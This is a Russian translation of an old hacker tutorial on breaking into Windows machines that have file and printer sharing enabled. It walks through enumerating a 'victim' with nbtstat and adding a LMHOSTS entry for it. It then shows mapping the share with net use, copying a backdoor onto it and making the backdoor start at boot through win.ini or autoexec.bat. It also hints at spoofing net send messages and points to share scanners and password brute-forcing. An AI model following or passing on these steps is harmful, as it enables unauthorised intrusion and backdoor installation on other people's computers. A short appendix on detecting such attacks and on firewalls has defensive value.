  Совместное использование Файлов и Принтеров
  Ghost_Rider (Ghost_Rider9@hotmail.com)
  R a v e N (barakirs@netvision.net.il)
  Дата публикации: 4/2/2000
  http://blacksun.box.sk
  Спасибо Oggy, он помог опубликовать эту заметку быстрее.
  Вольная интерпретация: Martin (martin@direct.spb.ru)


--------- Введение ---------

  Не стану вдаваться в детали, так как это может привести к излишней 
сложности для новичков - данная заметка предназначена именно им. 
Дополнительную информацию о совместном использовании файлов можно найти 
в Интернет или прочесть несколько хороших книг по администрированию сетей 
под управлением NT.

  Операционная система Windows имеет опцию, часто называемую совместным 
использованием файлов и принтеров или разделением ресурсов. Ее можно 
использовать для того, чтобы разрешить доступ к дискам и принтерам для 
других пользователей в локальной сети или даже пользователей по всему миру.
Когда включается эта опция, то остается открытым порт с номером 139, 
который принимает входящие соединения и "понимает" протокол NetBIOS - набор 
команд ("язык"), используемый для доступа к серверам, предоставляющим в 
совместное использование файлы и принтеры, так что другие компьютеры могут 
получить доступ к файлам и принтерам, которые предоставлены в совместное 
использование.

  Иногда в сети небольшой компании это может оказаться весьма полезным. 
Например, вместо использования отдельного принтера для каждого компьютера, 
существует один центральный принтер, подключенный к компьютеру с включенным 
совместным использованием файлов и принтеров. Но применять разделение 
ресурсов на домашнем компьютере, (есть много людей, у которых включена 
опция совместного использования файлов и принтеров и они ничего об этом 
не знают), подключенном к Интернет, весьма опасно, так как любой, кто знает 
его IP адрес может получить доступ к файлам и принтерам, предоставленным в 
совместное использование.

  Если Вы не знаете, включено или нет совместное использование файлов и 
принтеров на компьютере, войдите в Панель управления и выберите иконку Сеть. 
Теперь виден список всего установленного [системного] сетевого программного 
обеспечения, такого как TCP/IP (Протокол Контроля Передачи / Межсетевой 
Протокол. Этот протокол применяется для передачи пакетов данных через 
Интернет. Протокол похож на человеческий язык - если два компьютера понимают 
его, то они могут общаться) и, возможно, адаптер удаленного доступа (таким 
образом, Вы можете передавать TCP/IP пакеты через PPP соединение. PPP или 
Протокол Точка-Точка используется в соединениях удаленного доступа).
Проверьте, есть ли строка с текстом: Служба доступа к файлам и принтерам.

  Если эта строка есть, то для отключения Службы доступа к файлам и 
принтерам сбросьте флажок "Я хочу предоставить доступ к мои файлам". 
Вернемся к портам. Помните порт 139? Порт совместного использования файлов 
имеет номер 139 и называется "NetBIOS Session Service". Когда совместное 
использование файлов включено, открыты также еще два порта, но они 
используют протокол UDP вместо TCP. Это порты 137 (Служба Имен) и 138 
(Служба Датаграмм). Возможно, Вы слышали что-либо об атаках типа "Отказ в 
Обслуживании" (известные как nuke), тогда порт 139 должен звучать знакомо... 
Существуют атаки из серии "Отказ в Обслуживании", известные как OOB nuke 
(OOB означает "вне полосы пропускания") или winnuke, которые посылают OOB
пакеты к 139 порту и заставляют Windows оборвать соединение и приводят к 
"синему экрану". Если Вы хотите узнать больше об атаках типа "Отказ в 
Обслуживании", я предлагаю подождать выхода заметки по этой теме.
  Достаточно слов, приступим к делу.


--------- Вторжение ---------

  Я объясню, как проникнуть в машину под управлением Windows с включенным 
совместным использованием файлов и принтеров двумя способами. Для того, 
чтобы убедиться, как ненадежны Windows, достаточно программ, которые 
поставляются вместе с ней [операционной системой]. Разве это не иронично? 
Конечно, они поставляются вместе с Windows! Неужели Вы ожидали от Microsoft, 
что она будет поставлять ОС с возможностью совместного использования 
ресурсов и без средств для доступа к этим ресурсам?
  Сегодня Вы можете взломать службу совместного доступа к файлам и принтерам 
и с UNIX машины. Мы подойдем к этому в конце статьи. Сейчас же мы пользуемся 
только Windows. Оба способа взлома начинаются одинаково, но в одном случае 
необходимо набирать команды, а в другом использовать графический интерфейс. 
Необходимые программы называются Nbtstat.exe и Net.exe - их можно найти в 
директории Windows. Программы запускаются из командной строки. Для того, 
чтобы просмотреть справку для nbtstat наберите nbtstat /? и для net наберите 
net /? соответственно. Если Вы используете Windows 95, то возможно, что 
отключена опция поддержки NetBIOS поверх TCP/IP и тогда Nbtstat не станет 
работать, и выдаст сообщение вроде такого: "Failed to access NBT driver" 
без кавычек, конечно. В таком случае откройте Панель управления, выберите 
иконку Сеть, далее свойства TCP/IP, вкладка NetBIOS. Установите флажок 
(он там один). В случае использования Windows 98 сообщение об ошибке не 
появится если только не запущена какая-либо программа, блокирующая порт 139 
(например, Nukenubber). Многие люди включают такие программы в надежде 
отловить попытки OOB атак на их машины (обычно новички, которые не могут 
использовать брандмауэр, или, что еще хуже, ламеры, которые и не пытаются. 
Надеюсь, это не Вы:)
  Итак, наверняка Вы догадались, что включение NetBIOS поверх TCP/IP 
открывает эти самые три порта, которые используются для доступа к 
компьютеру. Это так, ибо для того, чтобы использовать тот же самый 
протокол, необходимо использовать те же самые порты по умолчанию, 
или можно использовать эмулятор терминала для соединения с портом 
139 для набора команд протокола, но это лишняя проблема. Пока нет 
никаких проблем с совместным использованием файлов, так как оно 
пока не включено, всего лишь открылись порты (однако, теперь наша 
машина подвержена атакам "Отказ в Обслуживании": можно использовать 
брандмауэр или получить патч на www.theargon.com)

  Итак, осталось выбрать компьютер-жертву. Можно использовать как 
имя, так и IP адрес: разница в ключах, которые необходимо указать. 
Предположим, что имя компьютера Mycomputer.MyIsp.com и 194.65.34.3
есть его IP адрес. Первое, что нужно сделать, проверить, предоставляет 
ли машина ресурсы в совместное использование. Как? Просто, наберите:

  nbtstat -a hostname

  В нашем случае: nbtstat -a Mycomputer.MyIsp.com, но если используется IP 
адрес, то необходимо набрать:

  nbtstat -A IP

  В данном случае nbtstat -A 194.65.34.3 Это кажется странным, ведь DOS на 
различает регистр букв... Но здесь это работает, так как это параметры.
  Теперь можно получить два типа ответов. Первый: "Host Not Found". В этом 
случае можно оставить попытки получить доступ к ресурсам машины, так как на 
ней не активизирован протокол NetBIOS или мы ошиблись при наборе имени или 
адреса. С другой стороны, если получена таблица с именами, типами ресурсов 
и статусом, это может быть удачей! Если эта таблица получена, то мы на 
полпути к удачному завершению операции. Но помните, что иногда и получение 
этой таблицы может не дать ничего полезного, так как компьютер может не 
предоставлять ничего в совместное использование.

  Таблица должна выглядеть примерно так:

Name                       Type        Status
----------------------------------------------------------------------------
Host           <20>       UNIQUE      Registered
Hostbug        <00>       GROUP       Registered
Host machine   <03>       UNIQUE      Registered


----------------------------------------------------------------------------
  Чтобы просмотреть свою собственную таблицу, наберите nbtstat -n
----------------------------------------------------------------------------
  Значания в <xx> скобках могут быть такими:
  00 основные имена компьютеров и рабочих групп
  01 мастер-браузер
  03 служба сообщений/предупреждений <--- Это важно ----
  20 имя службы разделения ресурсов <--- Обратите внимание ----
  1B имя мастер-браузера домена
  1C имя контроллера домена
  1E оповещение выборов мастер-браузера домена/рабочей группы

----------------------------------------------------------------------------
  Я расскажу о службе сообщений/предупреждений позже, если хотите прочесть 
об этом сейчас, пролистайте вниз до раздела Служба сообщений/предупреждений.
----------------------------------------------------------------------------
  Итак, если значение в скобках <xx> равно 20 (кстати, это шестнадцатеричное 
значение), то совместное использование ресурсов активизировано. Итак, как же 
можно проникнуть в машину? Легко. Во-первых, необходимо создать запись в 
файле LMHOSTS (его можно найти в папке C:\WINDOWS\. Там же есть файл с 
примерами записей с именем LMHOSTS.SAM) Если файл LMHOSTS не существует, то
создайте его. 

Посмотрите на примерное содержимое файла:

--- Lmhosts.sam file ---
# Copyright (c) 1993-1995 Microsoft Corp.
#
# This is a sample LMHOSTS file used by the Microsoft TCP/IP for Windows
# NT.
#
# This file contains the mappings of IP addresses to NT computernames
# (NetBIOS) names.  Each entry should be kept on an individual line.
# The IP address should be placed in the first column followed by the
# corresponding computername. The address and the comptername
# should be separated by at least one space or tab. The "#" character
# is generally used to denote the start of a comment (see the exceptions
# below).
#
# This file is compatible with Microsoft LAN Manager 2.x TCP/IP lmhosts
# files and offers the following extensions:
#
#      #PRE
#      #DOM:<domain>
#      #INCLUDE <filename>
#      #BEGIN_ALTERNATE
#      #END_ALTERNATE
#      \0xnn (non-printing character support)
#
# Following any entry in the file with the characters "#PRE" will cause
# the entry to be preloaded into the name cache. By default, entries are
# not preloaded, but are parsed only after dynamic name resolution fails.
#
# Following an entry with the "#DOM:<domain>" tag will associate the
# entry with the domain specified by <domain>. This affects how the
# browser and logon services behave in TCP/IP environments. To preload
# the host name associated with #DOM entry, it is necessary to also add a
# #PRE to the line. The <domain> is always preloaded although it will not
# be shown when the name cache is viewed.
#
# Specifying "#INCLUDE <filename>" will force the RFC NetBIOS (NBT)
# software to seek the specified <filename> and parse it as if it were
# local. <filename> is generally a UNC-based name, allowing a
# centralized lmhosts file to be maintained on a server.
# It is ALWAYS necessary to provide a mapping for the IP address of the
# server prior to the #INCLUDE. This mapping must use the #PRE directive.
# In addtion the share "public" in the example below must be in the
# LanManServer list of "NullSessionShares" in order for client machines to
# be able to read the lmhosts file successfully. This key is under
# \machine\system\currentcontrolset\services\lanmanserver\parameters\
# \nullsessionshares
# in the registry. Simply add "public" to the list found there.
#
# The #BEGIN_ and #END_ALTERNATE keywords allow multiple #INCLUDE
# statements to be grouped together. Any single successful include
# will cause the group to succeed.
#
# Finally, non-printing characters can be embedded in mappings by
# first surrounding the NetBIOS name in quotations, then using the
# \0xnn notation to specify a hex value for a non-printing character.
#
# The following example illustrates all of these extensions:
#
# 102.54.94.97     rhino         #PRE #DOM:networking  #net group's DC
# 102.54.94.102    "appname  \0x14"                    #special app server
# 102.54.94.123    popular            #PRE             #source server
# 102.54.94.117    localsrv           #PRE             #needed for the include
#
# #BEGIN_ALTERNATE
# #INCLUDE \\localsrv\public\lmhosts
# #INCLUDE \\rhino\public\lmhosts
# #END_ALTERNATE
#
# In the above example, the "appname" server contains a special
# character in its name, the "popular" and "localsrv" server names are
# preloaded, and the "rhino" server name is specified so it can be used
# to later #INCLUDE a centrally maintained lmhosts file if the "localsrv"
# system is unavailable.
#
# Note that the whole file is parsed including comments on each lookup,
# so keeping the number of comments to a minimum will improve performance.
# Therefore it is not advisable to simply add lmhosts file entries onto the
# end of this file.

  Чтобы создать запись, просто откройте LMHOSTS в любом текстовом редакторе 
и наберите IP адрес компьютера-жертвы, нажмите клавишу TAB и наберите имя 
ресурса (то, что находится под полем Name результата работы Nbtstat). 
Сохраните файл и закройте его. Теперь есть два пути для доступа к удаленным 
ресурсам: простой и продвинутый.


  --- Простой путь (графический интерфейс) ---

  Выберите Пуск->Найти->Компьютер и введите IP адрес машины-жертвы. Если 
запись в файле LMHOSTS верна, то в окне поиска будет показана иконка, 
символизирующая искомый компьютер. Щелкните по ней и начните просмотр 
ресурсов так же, как и на локальном компьютере.


  --- Продвинутый путь ----

  Пришло время изучить программу net.exe - для этого наберите net /? в окне
DOS. Советую перенаправить результат работы программы в текстовый файл и
просматривать его позже. Для этого наберите net /? > somefile.txt для записи
в файл somefile.txt результата работы программы net. Можно использовать >>
вместо >, тогда информация будет добавлена к файлу somefile.txt, а не 
записана поверх оного. Для получения информации о какой-либо опции команды 
net, наберите net option /?, где option - интересующая опция. Для доступа к 
ресурсу создайте виртуальный диск:

  net use drive \\[ipaddress]\[sharename]

Где: 

  - drive это имя диска, например f: g: z:
  - ipaddress это адрес удаленной машины
  - sharename это имя ресурса (вспомните таблицу Nbtstat)

После этого необходимо набрать имя диска и просматривать его в стиле DOS.
Например, набрать f: (в командной строке), если ранее  был подключен 
виртуальный диск F.

Пример:

  Предположим, Вы создали бэкдор (программу для управления удаленными
машинами) и хотите запустить его на машине с установленным совместным 
использованием ресурсов: имя ресурса Flintstone, адрес машины 145.42.23.14

  c:\>net use f: \\145.42.23.14\Flinstone

Теперь необходимо скопировать бэкдор на новый виртуальный диск.

  c:\>copy backdoor.exe f:\backdoor.exe

Далее добавьте в файл win.ini строку:

  run=PATH_TO_BACKDOOR:\backdoor.exe

Где PATH_TO_BACKDOOR - полный путь к бэкдору на удаленной машине

  Вместо этого, можно добавить аналогичную строку в файл autoexec.bat - при 
следующей перезагрузке программа - бэкдор получит управление.


--------- Служба сообщений/предупреждений ---------

  Что это такое? Это вовсе не то, что дает возможность получить доступ к 
файлам, но все же это интересно, так как позволяет посылать сообщения  на 
удаленную машину. Помните однако, что в окне с сообщением будет отображен 
адрес Вашей машины, но если его изменить (сфальсифицировать), то все будет 
вполне приемлемо.
  Для использования этой службы необходимо создать запись в файле LMHOSTS. 
Все это работает только в локальных сетях, но не в Интернет, так как здесь 
используется широковещательный механизм (все широковещательные сообщения от 
Вашего домашнего компьютера, подключенного к Сети через провайдера, будут 
отброшены на первом же маршрутизаторе по соображениям безопасности).
  Для посылки сообщения другому компьютеру, необходимо наличие записи <03> 
в таблице, полученной от Nbtstat.

   <03>  messaging/alerter service; Имя активного пользователя 

Если это так, то для отправки сообщения наберите:

  net send sharename message

Если Вы в локальной сети и не желаете, чтобы Вас беспокоили, наберите:

  net stop messenger

Это остановит службу сообщений и посылать и принимать сообщения станет 
невозможно. Для возобновления этой возможности наберите:

  net start messenger


Приложение A: Доступ к ресурсам Windows с UNIX машин
----------------------------------------------------
Самый простой способ состоит в применении программы LinNeighborhood, которую 
можно получить с узла http://www.bnro.de/~schmidjo/. Однако, можно получить 
доступ и при помощи консоли или окна xterm, применяя команды smb. Дальнейшую 
информацию можно получить в справочнике man по следующим командам:
smbclient  smbmnt     smbmount   smbprint   smbumount


Приложение B: Поиск машин, разделяющих ресурсы
----------------------------------------------
Предположим, что администратор сети хочет выявить уязвимые машины свой сети. 
Или же хакер пытается найти потенциальные жертвы. В обоих случаях необходим 
сканер ресурсов, который сделает эту работу. Сканер ресурсов может 
просматривать целые подсети в поисках машин, разделяющих ресурсы. Загрузите 
копии таких программ, как Legion или NbtScan с узла packetstorm.securify.com


Приложение C: Защищенные паролем ресурсы
----------------------------------------
Предположим, что администратор хочет проверить, насколько хорошо выбраны
пароли, которыми защищены ресурсы в сети. Или хакер нашел защищенный 
паролем ресурс и не знает, что делать далее... Можно попробовать перебирать 
все возможные пароли, пока не будет найден правильный. Для этого существуют 
различные программы, Cain - одна из них, имеющая интересные возможности.


Приложение D: Выявление атак на ресурсы
---------------------------------------
Атаки на разделяемые ресурсы обычно весьма легко выявить (если только 
атакующий не фальсифицирует свой IP адрес или не использует другую машину 
в качестве плацдарма для атак). Простейшая программа для выявления атак - 
Lockdown 2000, ее можно получить с узла www.lockdown.com. Однако она не 
всегда хорошо работает и имеет множество ошибок. Можно попробовать 
Norton AtGuard (www.norton.com) - я надеюсь, что она способна определить 
атаки на разделяемые ресурсы, но сам ее не пробовал.
  Если же говорить о серьезных мерах, необходимо установить хороший 
брандмауэр или систему определения вторжения. Мне нравится ipchains для 
UNIX систем, который можно загрузить с linux.box.sk, freshmeat.net и 
других узлов, для Windows я рекомендую Firewall-1 (поищите ее в Сети).


Приложение E: Простой способ доступа к ресурсам
-----------------------------------------------
Предположим, что мы получили IP адрес жертвы и имя разделяемого ресурса. 
Тогда выбираем "Пуск", "Выполнить" и набираем:
\\ip-address(или hostname)\sharename
Например: \\65.4.78.203\someshare
Теперь можно просматривать удаленные ресурсы через Проводник, не подключая 
сетевых дисков.



http://blacksun.box.sk
